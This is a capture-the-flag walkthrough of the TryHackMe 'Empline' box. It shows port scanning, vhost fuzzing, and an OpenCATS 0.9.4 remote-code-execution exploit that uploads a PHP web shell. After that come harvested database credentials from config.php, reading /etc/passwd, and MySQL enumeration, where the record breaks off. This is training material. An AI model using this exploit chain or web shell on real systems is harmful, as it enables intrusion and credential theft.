----
Are you good enough to apply for this job?
----

![111](https://tryhackme-images.s3.amazonaws.com/room-icons/189112ffef41c0fa813d7d5b394a58b5.png)

###  Deploy The Box

 Start Machine

Deploy and compromise the machine!

![222](https://i.imgur.com/gCpTGtH.png)  

Make sure you're connected to [TryHackMe's network](https://tryhackme.com/access). If you don't know how to do this, complete the [OpenVPN room](https://tryhackme.com/room/openvpn) first.

Answer the questions below

Deploy the machine!  

Question Done

### Submit The Flags

Get all the flags to complete the room.  

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.183.162 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.183.162:22
Open 10.10.183.162:80
Open 10.10.183.162:3306
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 12:59 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
Initiating Connect Scan at 12:59
Scanning empline.thm (10.10.183.162) [3 ports]
Discovered open port 3306/tcp on 10.10.183.162
Discovered open port 80/tcp on 10.10.183.162
Discovered open port 22/tcp on 10.10.183.162
Completed Connect Scan at 12:59, 0.20s elapsed (3 total ports)
Initiating Service scan at 12:59
Scanning 3 services on empline.thm (10.10.183.162)
Completed Service scan at 12:59, 6.72s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.183.162.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 9.20s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 2.46s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
Nmap scan report for empline.thm (10.10.183.162)
Host is up, received user-set (0.19s latency).
Scanned at 2023-04-10 12:59:20 EDT for 19s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c0d541eea4d0830c970d75cc7b107f76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDR9CEnxhm89ZCC+SGhOpO28srSTnL5lQtnqd4NaT7hTT6N1NrRZQ5DoB6cBI+YlaqYe3I4Ud3y7RF3ESms8L21hbpQus2UYxbWOl+/s3muDpZww1nvI5k9oJguQaLG1EroU8tee7yhPID0+285jbk5AZY72pc7NLOMLvFDijArOhj9kIcsPLVTaxzQ6Di+xwXYdiKO0F3Y7GgMMSszIeigvZEDhNnNW0Z1puMYbtTgmvJH6LpzMSEC+32iNRGlvbjebE9Ehh+tGiOuHKXT1uexrt7gbkjp3lJteV5034a7G1t/Vi3JJoj9tMV/CrvgeDDncbT5NNaSA6/ynLLENqSP
|   256 8382f969197d0d5c5365d554f645db74 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFhf+BTt0YGudpgOROEuqs4YuIhT1ve23uvZkHhN9lYSpK9WcHI2K5IXIi+XgPeSk/VIQLsRUA0kOqbsuoxN+u0=
|   256 4f913e8b696909700e8226285c8471c9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDkr5yXgnawt7un+3Tf0TJ+sZTrbVIY0TDbitiu2eHpf
80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Empline
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
3306/tcp open  mysql   syn-ack MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
|   Thread ID: 95
|   Capabilities flags: 63487
|   Some Capabilities: ConnectWithDatabase, ODBCClient, InteractiveClient, LongPassword, LongColumnFlag, SupportsCompression, Support41Auth, Speaks41ProtocolNew, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: 8Rqe(3g.Ls!G#wRqd~m)
|_  Auth Plugin Name: mysql_native_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:59
Completed NSE at 12:59, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.81 seconds


┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts       
10.10.183.162 empline.thm

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster vhost -u http://empline.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain       
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://empline.thm
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/04/10 12:42:36 Starting gobuster in VHOST enumeration mode
===============================================================
Found: job.empline.thm Status: 200 [Size: 3671]
Found: gc._msdcs.empline.thm Status: 400 [Size: 422]


┌──(witty㉿kali)-[~/Downloads]
└─$ wfuzz -u empline.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.empline.thm" --hc 404 --hw 914
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://empline.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload          
=====================================================================

000000266:   200        101 L    291 W      3671 Ch     "job" 

found 1 subdomain

┌──(witty㉿kali)-[~/Downloads]
└─$ tac /etc/hosts
10.10.183.162 empline.thm job.empline.thm

https://www.exploit-db.com/exploits/50585

another way https://doddsecurity.com/312/xml-external-entity-injection-xxe-in-opencats-applicant-tracking-system/


┌──(witty㉿kali)-[/tmp]
└─$ ./opencats.sh http://job.empline.thm/
 _._     _,-'""`-._ 
(,-.`._,'(       |\`-/|        RevCAT - OpenCAT RCE
    `-.-' \ )-`( , o o)         Nicholas  Ferreira
          `-    \`_`"'-   https://github.com/Nickguitar-e 

[*] Attacking target http://job.empline.thm/
[*] Checking CATS version...
-e [*] Version detected: 0.9.4
[*] Creating temp file with payload...
[*] Checking active jobs...
./opencats.sh: 105: [[: not found
-e [+] Jobs found! Using job id 1
[*] Sending payload...
-e [+] Payload zp8st.php uploaded!
[*] Deleting created temp file...
[*] Checking shell...
-e [+] Got shell! :D
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux empline 4.15.0-147-generic #151-Ubuntu SMP Fri Jun 18 19:21:19 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
-e 
$ whoami
www-data
-e 
$ ls
zp8st.php
-e 
$ cat zp8st.php
GIF87a<?php echo system($_REQUEST[0]); ?>
-e 

$ ls -lah /
total 92K
drwxr-xr-x  24 root root 4.0K Apr 10 16:22 .
drwxr-xr-x  24 root root 4.0K Apr 10 16:22 ..
drwxr-xr-x   2 root root 4.0K Jun 23  2021 bin
drwxr-xr-x   3 root root 4.0K Jun 23  2021 boot
drwxr-xr-x  16 root root 3.6K Apr 10 16:21 dev
drwxr-xr-x  98 root root 4.0K Jul 20  2021 etc
drwxr-xr-x   4 root root 4.0K Jul 20  2021 home
lrwxrwxrwx   1 root root   34 Jun 23  2021 initrd.img -> boot/initrd.img-4.15.0-147-generic
lrwxrwxrwx   1 root root   34 Jun 23  2021 initrd.img.old -> boot/initrd.img-4.15.0-147-generic
drwxr-xr-x  21 root root 4.0K Jun 23  2021 lib
drwxr-xr-x   2 root root 4.0K Jun 23  2021 lib64
drwx------   2 root root  16K Jun 23  2021 lost+found
drwxr-xr-x   2 root root 4.0K Jun 23  2021 media
drwxr-xr-x   2 root root 4.0K Jun 23  2021 mnt
drwxr-xr-x   2 root root 4.0K Jun 23  2021 opt
dr-xr-xr-x 101 root root    0 Apr 10 16:20 proc
drwx------   4 root root 4.0K Jul 20  2021 root
drwxr-xr-x  26 root root  860 Apr 10 16:33 run
drwxr-xr-x   2 root root 4.0K Jun 23  2021 sbin
drwxr-xr-x   2 root root 4.0K Jul 20  2021 snap
drwxr-xr-x   2 root root 4.0K Jun 23  2021 srv
dr-xr-xr-x  13 root root    0 Apr 10 16:21 sys
drwxrwxrwt   2 root root 4.0K Apr 10 16:48 tmp
drwxr-xr-x  11 root root 4.0K Jun 23  2021 usr
drwxr-xr-x   2 root root 4.0K Jul 20  2021 vagrant
drwxr-xr-x  14 root root 4.0K Jul 20  2021 var
lrwxrwxrwx   1 root root   31 Jun 23  2021 vmlinuz -> boot/vmlinuz-4.15.0-147-generic
lrwxrwxrwx   1 root root   31 Jun 23  2021 vmlinuz.old -> boot/vmlinuz-4.15.0-147-generic
-e 
$ ls /var
backups
cache
crash
lib
local
lock
log
mail
opt
run
snap
spool
tmp
www
-e 
$ ls /var/backups
apt.extended_states.0
-e 
$ ls /var/www
html
opencats
-e 
$ ls /var/www/html
assets
index.html
prepros-6.config
-e 

$ find / -type f -name config.php
/var/www/opencats/config.php
/var/www/opencats/test/config.php
/var/www/opencats/optional-updates/latest-sphinx-search/config.php
-e 
$ cat /var/www/opencats/config.php
<?php
/*
 * CATS
 * Configuration File
 *
 * Copyright (C) 2005 - 2007 Cognizo Technologies, Inc.
 *
 *
 * The contents of this file are subject to the CATS Public License
 * Version 1.1a (the "License"); you may not use this file except in
 * compliance with the License. You may obtain a copy of the License at
 * http://www.catsone.com/.
 *
 * Software distributed under the License is distributed on an "AS IS"
 * basis, WITHOUT WARRANTY OF ANY KIND, either express or implied. See the
 * License for the specific language governing rights and limitations
 * under the License.
 *
 * The Original Code is "CATS Standard Edition".
 *
 * The Initial Developer of the Original Code is Cognizo Technologies, Inc.
 * Portions created by the Initial Developer are Copyright (C) 2005 - 2007
 * (or from the year in which this file was created to the year 2007) by
 * Cognizo Technologies, Inc. All Rights Reserved.
 *
 *
 * $Id: config.php 3826 2007-12-10 06:03:18Z will $
 */

/* License key. */
define('LICENSE_KEY','3163GQ-54ISGW-14E4SHD-ES9ICL-X02DTG-GYRSQ6');

/* Database configuration. */
define('DATABASE_USER', 'james');
define('DATABASE_PASS', 'ng6pUFvsGNtw');
define('DATABASE_HOST', 'localhost');
define('DATABASE_NAME', 'opencats');

/* Authentication Configuration
 * Options are sql, ldap, sql+ldap
 */
define ('AUTH_MODE', 'sql');

/* Resfly.com Resume Import Services Enabled */
define('PARSING_ENABLED', false);

/* If you have an SSL compatible server, you can enable SSL for all of CATS. */
define('SSL_ENABLED', false);

/* Text parser settings. Remember to use double backslashes (\) to represent
 * one backslash (\). On Windows, installing in C:\antiword\ is
 * recomended, in which case you should set ANTIWORD_PATH (below) to
 * 'C:\\antiword\\antiword.exe'. Windows Antiword will have problems locating
 * mapping files if you install it anywhere but C:\antiword\.
 */
define('ANTIWORD_PATH', "/usr/bin/antiword");
define('ANTIWORD_MAP', '8859-1.txt');

/* XPDF / pdftotext settings. Remember to use double backslashes (\) to represent
 * one backslash (\).
 * http://www.foolabs.com/xpdf/
 */
define('PDFTOTEXT_PATH', "");

/* html2text settings. Remember to use double backslashes (\) to represent
 * one backslash (\). 'html2text' can be found at:
 * http://www.mbayer.de/html2text/
 */
define('HTML2TEXT_PATH', "");

/* UnRTF settings. Remember to use double backslashes (\) to represent
 * one backslash (\). 'unrtf' can be found at:
 * http://www.gnu.org/software/unrtf/unrtf.html
 */
define('UNRTF_PATH', "");

/* Temporary directory. Set this to a directory that is writable by the
 * web server. The default should be fine for most systems. Remember to
 * use double backslashes (\) to represent one backslash (\) on Windows.
 */
define('CATS_TEMP_DIR', './temp');

/* If User Details and Login Activity pages in the settings module are
 * unbearably slow, set this to false.
 */
define('ENABLE_HOSTNAME_LOOKUP', false);

/* CATS can optionally use Sphinx to speed up document searching.
 * Install Sphinx and set ENABLE_SPHINX (below) to true to enable Sphinx.
 */
define('ENABLE_SPHINX', false);
define('SPHINX_API', './lib/sphinx/sphinxapi.php');
define('SPHINX_HOST', 'localhost');
define('SPHINX_PORT', 3312);
define('SPHINX_INDEX', 'cats catsdelta');

/* Probably no need to edit anything below this line. */


/* Pager settings. These are the number of results per page. */
define('CONTACTS_PER_PAGE',      15);
define('CANDIDATES_PER_PAGE',    15);
define('CLIENTS_PER_PAGE',       15);
define('LOGIN_ENTRIES_PER_PAGE', 15);

/* Maximum number of characters of the owner/recruiter users' last names
 * to show before truncating.
 */
define('LAST_NAME_MAXLEN', 6);

/* Length of resume excerpts displayed in Search Candidates results. */
define('SEARCH_EXCERPT_LENGTH', 256);

/* Number of MRU list items. */
define('MRU_MAX_ITEMS', 5);

/* MRU item length. Truncate the rest */
define('MRU_ITEM_LENGTH', 20);

/* Number of recent search items. */
define('RECENT_SEARCH_MAX_ITEMS', 5);

/* HTML Encoding. */
define('HTML_ENCODING', 'UTF-8');

/* AJAX Encoding. */
define('AJAX_ENCODING', 'UTF-8');

/* SQL Character Set. */
define('SQL_CHARACTER_SET', 'utf8');

/* Insert BOM in the beginning of CSV file */
/* This is UTF-8 BOM, EF BB BF for UTF-8 */
define('INSERT_BOM_CSV_LENGTH', '3');
define('INSERT_BOM_CSV_1', '239');
define('INSERT_BOM_CSV_2', '187');
define('INSERT_BOM_CSV_3', '191');
define('INSERT_BOM_CSV_4', '');

/* Path to modules. */
define('MODULES_PATH', './modules/');

/* Unique session name. The only reason you might want to modify this is
 * for multiple CATS installations on one server. A-Z, 0-9 only! */
define('CATS_SESSION_NAME', 'CATS');

/* Subject line of e-mails sent to candidates via the career portal when they
 * apply for a job order.
 */
define('CAREERS_CANDIDATEAPPLY_SUBJECT', 'Thank You for Your Application');

/* Subject line of e-mails sent to job order owners via the career portal when
 * they apply for a job order.
 */
define('CAREERS_OWNERAPPLY_SUBJECT', 'CATS - A Candidate Has Applied to Your Job Order');

/* Subject line of e-mails sent to candidates when their status changes for a
 * job order.
 */
define('CANDIDATE_STATUSCHANGE_SUBJECT', 'Job Application Status Change');

/* Password request settings.
 *
 * In FORGOT_PASSWORD_FROM, %s is the placeholder for the password.
 */
define('FORGOT_PASSWORD_FROM_NAME', 'CATS');
define('FORGOT_PASSWORD_SUBJECT',   'CATS - Password Retrieval Request');
define('FORGOT_PASSWORD_BODY',      'You recently requested that your OpenCATS: Applicant Tracking System password be sent to you. Your current password is %s.');

/* Is this a demo site? */
define('ENABLE_DEMO_MODE', false);

/* Offset to GMT Time. */
define('OFFSET_GMT', 0);

/* Should we enforce only one session per user (excluding demo)? */
define('ENABLE_SINGLE_SESSION', false);

/* Automated testing. This is only useful for the CATS core team at the moment;
 * don't worry about this yet.
 */
define('TESTER_LOGIN',     'john@mycompany.net');
define('TESTER_PASSWORD',  'john99');
define('TESTER_FIRSTNAME', 'John');
define('TESTER_LASTNAME',  'Anderson');
define('TESTER_FULLNAME',  'John Anderson');
define('TESTER_USER_ID',   4);

/* Demo login. */
define('DEMO_LOGIN',     'john@mycompany.net');
define('DEMO_PASSWORD',  'john99');

/* This setting configures the method used to send e-mail from CATS. CATS
 * can send e-mail via SMTP, PHP's built-in mail support, or via Sendmail.
 * 0 is recomended for Windows.
 *
 * 0: Disabled
 * 1: PHP Built-In Mail Support
 * 2: Sendmail
 * 3: SMTP
 */
define('MAIL_MAILER', 0);

/* Sendmail Settings. You don't need to worry about this unless MAIL_MAILER
 * is set to 2.
 */
define('MAIL_SENDMAIL_PATH', "/usr/sbin/sendmail");

/* SMTP Settings. You don't need to worry about this unless MAIL_MAILER is
 * set to 3. If your server requires authentication, set MAIL_SMTP_AUTH to
 * true and configure MAIL_SMTP_USER and MAIL_SMTP_PASS.
 */
define('MAIL_SMTP_HOST', "localhost");
define('MAIL_SMTP_PORT', 587);
define('MAIL_SMTP_AUTH', false);
define('MAIL_SMTP_USER', "user");
define('MAIL_SMTP_PASS', "password");
//Options: '', 'ssl' or 'tls'
define('MAIL_SMTP_SECURE', "tls");

/* Event reminder E-Mail Template. */
$GLOBALS['eventReminderEmail'] = <<<EOF
%FULLNAME%,

This is a reminder from the OpenCATS Applicant Tracking System about an
upcoming event.

'%EVENTNAME%'
Is scheduled to occur %DUETIME%.

Description:
%NOTES%

--
OPENCATS Applicant Tracking System
EOF;

/* Enable replication slave mode? This is probably only useful for the CATS
 * core team. If this setting is enabled, no writing to the database will
 * occur, and only ROOT users can login.
 */
define('CATS_SLAVE', false);

/* If enabled, CATS only scans the modules folder once and stores the results
 * in modules.cache.  When enabled, a performance boost is obtained, but
 * any changes to hooks, schemas, or what modules are installed will require
 * modules.cache to be deleted before they take effect.
 */

define('CACHE_MODULES', false);

/* If enabled, the US zipcode database is installed and the user can filter
 * by distance from a zipcode.
 */

define('US_ZIPS_ENABLED', false);

/* LDAP Configuration
 */
define ('LDAP_HOST', 'ldap.forumsys.com');
define ('LDAP_PORT', '389');
define ('LDAP_PROTOCOL_VERSION', 3);

define ('LDAP_BASEDN', 'dc=example,dc=com');

define ('LDAP_BIND_DN', 'cn=read-only-admin,dc=example,dc=com');
define ('LDAP_BIND_PASSWORD', 'password');

define ('LDAP_ACCOUNT', '{$username}'); // '{$username}' cannot be changed, else can

define ('LDAP_ATTRIBUTE_UID', 'uid');
define ('LDAP_ATTRIBUTE_DN', 'dn');
define ('LDAP_ATTRIBUTE_LASTNAME', 'sn');
define ('LDAP_ATTRIBUTE_FIRSTNAME', 'givenname');
define ('LDAP_ATTRIBUTE_EMAIL', 'mail');

define ('LDAP_SITEID', 1);


/* Job Types mapping
 */
/* Uncomment bellow if you want custom mapping */
/*const JOB_TYPES_LIST = array(
    'PT' => 'Part-Time',
    'FT' => 'Full-Time',
    'ST' => 'Student',
    'FL' => 'Freelance'
);*/


/*
require_once('.\constants.php');
// defining user roles
const USER_ROLES = array(
        'candidate' => array('Candidate', 'candidate', 'This is a candidate.', ACCESS_LEVEL_SA, ACCESS_LEVEL_READ),
        'demo' => array('Demo', 'demo', 'This is a demo user.', ACCESS_LEVEL_SA, ACCESS_LEVEL_READ)
    );

// defining access levels different from the default access level
const ACCESS_LEVEL_MAP = array(
        'candidate' => array(
        ),
        'demo' => array(
            'candidates' => ACCESS_LEVEL_DELETE,
            'candidates.emailCandidates' => ACCESS_LEVEL_DISABLED,
            'candidates.history' => ACCESS_LEVEL_DEMO,
            'joborders' => ACCESS_LEVEL_DELETE,
            'joborders.show' => ACCESS_LEVEL_DEMO,
            'joborders.email' => ACCESS_LEVEL_DISABLED,
        )
    );*/

/* All possible secure object names
            'candidates.history'
            'settings.administration'
            'joborders.editRating'
            'pipelines.screening'
            'pipelines.editActivity'
            'pipelines.removeFromPipeline'
            'pipelines.addActivityChangeStatus'
            'pipelines.addToPipeline'
            'settings.tags'
            'settings.changePassword'
            'settings.newInstallPassword'
            'settings.forceEmail'
            'settings.newSiteName'
            'settings.upgradeSiteName'
            'settings.newSiteName'
            'settings.manageUsers'
            'settings.professional'
            'settings.previewPage'
            'settings.previewPageTop'
            'settings.showUser'
            'settings.addUser'
            'settings.editUser'
            'settings.createBackup'
            'settings.deleteBackup'
            'settings.customizeExtraFields'
            'settings.customizeCalendar'
            'settings.reports'
            'settings.careerPortalQuestionnairePreview'
            'settings.careerPortalQuestionnaire'
            'settings.careerPortalQuestionnaireUpdate'
            'settings.careerPortalTemplateEdit'
            'settings.careerPortalSettings'
            'settings.eeo'
            'settings.careerPortalTweak'
            'settings.deleteUser'
            'settings.aspLocalization'
            'settings.loginActivity'
            'settings.viewItemHistory'
            'settings.addUser'
            'settings.deleteUser'
            'settings.checkKey'
            'settings.localization'
            'settings.firstTimeSetup'
            'settings.license'
            'settings.password'
            'settings.siteName'
            'settings.setEmail'
            'settings.import'
            'settings.website'
            'settings.administration'
            'settings.myProfile'
            'settings.administration.localization'
            'settings.administration.systemInformation'
            'settings.administration.changeSiteName'
            'settings.administration.changeVersionName'
            'settings.addUser'
            'joborders.edit'
            'joborders.careerPortalUrl'
            'joborders.deleteAttachment'
            'joborders.createAttachement'
            'joborders.delete'
            'joborders.hidden'
            'joborders.considerCandidateSearch'
            'joborders.show'
            'joborders.add'
            'joborders.search'
            'joborders.administrativeHideShow'
            'joborders.list'
            'joborders.email'
            'candidates.add'
            'import.import'
            'import.massImport'
            'import.bulkResumes'
            'contacts.addActivityScheduleEvent'
            'contacts.edit'
            'contacts.delete'
            'contacts.editActivity'
            'contacts.deleteActivity'
            'contacts.logActivityScheduleEvent'
            'contacts.show'
            'contacts.add'
            'contacts.edit'
            'contacts.delete'
            'contacts.search'
            'contacts.addActivityScheduleEvent'
            'contacts.showColdCallList'
            'contacts.downloadVCard'
            'contacts.list'
            'contacts.emailContact'
            'companies.deleteAttachment'
            'companies.createAttachment'
            'companies.edit'
            'companies.delete'
            'companies.show'
            'companies.internalPostings'
            'companies.add'
            'companies.edit'
            'companies.delete'
            'companies.search'
            'companies.createAttachment'
            'companies.deleteAttachment'
            'companies.list'
            'companies.email'
            'candidates.deleteAttachment'
            'candidates.addActivityChangeStatus'
            'candidates.deleteAttachment'
            'candidates.createAttachment'
            'candidates.addCandidateTags'
            'candidates.edit'
            'candidates.delete'
            'candidates.administrativeHideShow'
            'candidates.considerForJobSearch'
            'candidates.manageHotLists'
            'candidates.show'
            'candidates.add'
            'candidates.search'
            'candidates.viewResume'
            'candidates.search'
            'candidates.hidden'
            'candidates.emailCandidates'
            'candidates.show_questionnaire'
            'candidates.list'
            'calendar.show'
            'calendar.addEvent'
            'calendar.editEvent'
            'calendar.deleteEvent'
            */

james:ng6pUFvsGNtw (mysql creds)

$ ls /home
george
ubuntu

$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 10.10.183.162:68        0.0.0.0:*                           - 
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
george:x:1002:1002::/home/george:/bin/bash

┌──(witty㉿kali)-[~/Downloads]
└─$ mysql -h 10.10.183.162 -u james -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 105
Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| opencats           |
+--------------------+
2 rows in set (0.192 sec)

MariaDB [(none)]> use opencats;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [opencats]> show tables;
+--------------------------------------+
| Tables_in_opencats                   |
+--------------------------------------+
| access_level                         |
| activity                             |
| activity_type                        |
| attachment                           |
| calendar_event                       |
| calendar_event_type                  |
| candidate                            |
| candidate_joborder                   |
| candidate_joborder_status            |
| candidate_joborder_status_history    |
| candidate_jobordrer_status_type      |
| candidate_source                     |
| candidate_tag                        |
| career_portal_questionnaire          |
| career_portal_questionnaire_answer   |
| career_portal_questionnaire_history  |
| career_portal_questionnaire_question |
| career_portal_template               |
| career_portal_template_site          |
| company                              |
| company_department                   |
| contact                              |
| data_item_type                       |
| eeo_ethnic_type                      |
| eeo_veteran_type                     |
| email_history                        |
| email_template                       |
| extension_statistics                 |
| extra_field                          |
| extra_field_settings                 |
| feedback                             |
| history                              |
| http_log                             |
| http_log_types                       |
| import                               |
| installtest                          |
| joborder                             |
| module_schema                        |
| mru                                  |
| queue                                |
| saved_list                           |
| saved_list_entry                     |
| saved_search                         |
| settings                             |
| site                                 |
| sph_counter                          |
| system                               |
| tag                                  |
| user                                 |
| user_login                           |
| word_verification                    |
| xml_feed_submits                     |
| xml_feeds                            |
| zipcodes                             |
+--------------------------------------+
54 rows in set (0.326 sec)

MariaDB [opencats]> describe user;
+---------------------------+--------------+------+-----+---------+----------------+
| Field                     | Type         | Null | Key | Default | Extra          |
+---------------------------+--------------+------+-----+---------+----------------+
| user_id                   | int(11)      | NO   | PRI | NULL    | auto_increment |
| site_id                   | int(11)      | NO   | MUL | 0       |                |
| user_name                 | varchar(64)  | NO   |     |         |                |
| email                     | varchar(128) | YES  |     | NULL    |                |
| password                  | varchar(128) | NO   |     |         |                |
| access_level              | int(11)      | NO   | MUL | 100     |                |
| can_change_password       | int(1)       | NO   |     | 1       |                |
| is_test_user              | int(1)       | NO   |     | 0       |                |
| last_name                 | varchar(40)  | NO   | MUL |         |                |
| first_name                | varchar(40)  | NO   | MUL |         |                |
| is_demo                   | int(1)       | YES  |     | 0       |                |
| categories                | varchar(192) | YES  |     | NULL    |                |
| session_cookie            | varchar(256) | YES  |     | NULL    |                |
| pipeline_entries_per_page | int(8)       | YES  |     | 15      |                |
| column_preferences        | longtext     | YES  |     | NULL    |                |
| force_logout              | int(1)       | YES  |     | 0       |                |
| title                     | varchar(64)  | YES  |     |         |                |
| phone_work                | varchar(64)  | YES  |     |         |                |
| phone_cell                | varchar(64)  | YES  |     |         |                |
| phone_other               | varchar(64)  | YES  |     |         |                |
| address                   | text         | YES  |     | NULL    |                |
| notes                     | text         | YES  |     | NULL    |                |
| company                   | varchar(255) | YES  |     | NULL    |                |
| city                      | varchar(64)  | YES  |     | NULL    |                |
| state                     | varchar(64)  | YES  |     | NULL    |                |
| zip_code                  | varchar(16)  | YES  |     | NULL    |                |
| country                   | varchar(128) | YES  |     | NULL    |                |
| can_see_eeo_info          | int(1)       | YES  |     | 0       |                |
